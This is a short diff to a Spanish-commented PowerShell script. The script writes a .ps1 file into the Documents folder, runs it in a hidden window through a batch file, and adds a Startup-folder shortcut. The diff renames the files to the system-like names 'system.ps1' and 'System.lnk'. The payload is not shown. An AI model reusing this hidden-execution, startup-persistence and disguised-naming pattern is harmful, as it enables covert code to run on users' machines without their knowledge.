@@ -7,7 +7,7 @@ $seconds = 30
 $documentsFolder = [Environment]::GetFolderPath("MyDocuments")
 
 # Ruta completa del archivo de script en la carpeta de documentos
-$scriptPath = Join-Path -Path $documentsFolder -ChildPath "syswin.ps1"
+$scriptPath = Join-Path -Path $documentsFolder -ChildPath "system.ps1"
 
 # Verificar si el archivo de script ya existe
 if (-not (Test-Path -Path $scriptPath)) {
@@ -74,7 +74,7 @@ powershell.exe -WindowStyle Hidden -File "$scriptPath"
 Set-Content -Path $batFilePath -Value $batContent
 
 # Crear un acceso directo del archivo de lote en la carpeta de inicio para que se ejecute al iniciar Windows
-$shortcutPath = Join-Path -Path $startupFolder -ChildPath "Run_Script.lnk"
+$shortcutPath = Join-Path -Path $startupFolder -ChildPath "System.lnk"
 $WScriptShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WScriptShell.CreateShortcut($shortcutPath)
 $Shortcut.TargetPath = $batFilePath
